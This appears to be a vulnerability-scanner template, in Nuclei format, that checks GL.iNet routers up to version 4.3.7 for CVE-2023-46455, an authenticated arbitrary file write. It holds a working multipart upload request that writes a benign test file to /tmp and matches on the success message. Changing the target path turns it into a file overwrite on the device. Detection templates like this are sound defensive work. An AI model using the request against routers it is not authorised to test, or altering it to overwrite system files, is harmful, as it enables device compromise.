id: gl-inet-arbitrary-file-write

info:
  name: GL.iNet <= 4.3.7 Arbitrary File Write
  author: Zierax
  severity: critical
  tags: arbitrary-file-write, authenticated, file-upload
  description: |
    GL.iNet <= 4.3.7 is vulnerable to an arbitrary file write exploit, allowing an attacker to overwrite arbitrary system files.
  references:
    - https://www.gli-net.com
    - https://github.com/exploit-references/POC-for-CVE-2023-46455
  date: 2023-11-XX
  cve: CVE-2023-46455
  software:
    name: GL.iNet
    version: "<= 4.3.7"

requests:
  - method: POST
    path:
      - "{{BaseURL}}/upload"

    body: |
      -----------------------------81419250823331111993422505835
      Content-Disposition: form-data; name="sid"

      {{auth_token}}
      -----------------------------81419250823331111993422505835
      Content-Disposition: form-data; name="size"

      4
      -----------------------------81419250823331111993422505835
      Content-Disposition: form-data; name="path"

      /tmp/testfile
      -----------------------------81419250823331111993422505835
      Content-Disposition: form-data; name="file"; filename="testfile"
      Content-Type: application/octet-stream

      This is a harmless test file.
      -----------------------------81419250823331111993422505835--

    headers:
      Content-Type: multipart/form-data; boundary=---------------------------81419250823331111993422505835
      X-Requested-With: XMLHttpRequest

    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "File uploaded successfully"
        part: body
